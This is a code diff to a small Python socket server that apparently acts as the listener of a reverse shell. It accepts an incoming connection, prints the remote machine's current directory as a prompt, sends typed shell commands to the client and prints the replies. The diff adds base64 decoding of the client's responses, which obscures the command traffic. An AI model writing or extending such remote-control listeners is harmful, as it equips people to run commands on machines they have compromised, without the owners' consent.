@@ -1,8 +1,18 @@
 from __future__ import print_function
 import socket
 import sys
+import base64
 
 #Create a socket(allows connection)
+
+def get_base64(word):
+    encoded = base64.b64encode(word)
+    return encoded
+
+def un_base64(word):
+    decoded = base64.b64decode(word)
+    return decoded
+
 
 def socket_create():
     try:
@@ -32,15 +42,19 @@ def socket_bind():
 
 
 #now to accept connections
+
 def socket_accept():
     conn, address = s.accept() # accepts new connection
     print("Connection received from | " + "IP: " + address[0] + " | Port " + str(address[1]))
-    #conn.send("connected")
-    dirs = conn.recv(1024)
-    dirs2 = dirs.split("/")
-    dir3 = (dirs2[-1:])
-    print(''.join([str(item) for item in dir3]),end="")
 
+    #     #Splitting dir and show a directory with a > to be user friendly
+
+    # dirs = conn.recv(1024)
+    # dirs2 = dirs.split("/")
+    # dir3 = (dirs2[-1:])
+    # print(''.join([str(item) for item in dir3]),end="")
+    #     #the below is the shrinking of the above commands
+    print(''.join(un_base64(conn.recv(1024)).split("/")[-1:]) + " >",  end='')
     #print(dirs, end='')
     send_commands(conn)
     conn.close()
@@ -58,13 +72,15 @@ def send_commands(conn):
             if len(str.encode(cmd)) > 0:
             #if len(cmd.encode('ascii')) > 0:#commands in Terminal are sent in bytes
                 conn.send(str.encode(cmd))
+
                 #conn.send(cmd.encode('ascii'))
                 #client_response = str(conn.recv(1024), "utf-8")
                 #client_response = str(conn.recv(1024))#converting from bytes to basic character encoding
                 client_response = conn.recv(1024)
+                b64_decoding = un_base64(client_response)
                 #print("command sent %s") % cmd
-                print("Response Received: ")
-                print(client_response, end='') #dont give new line character at end)
+                #print("Response Received: ")
+                print(b64_decoding, end='') #dont give new line character at end)
         except any:
             print("ERROR")
             conn.close()
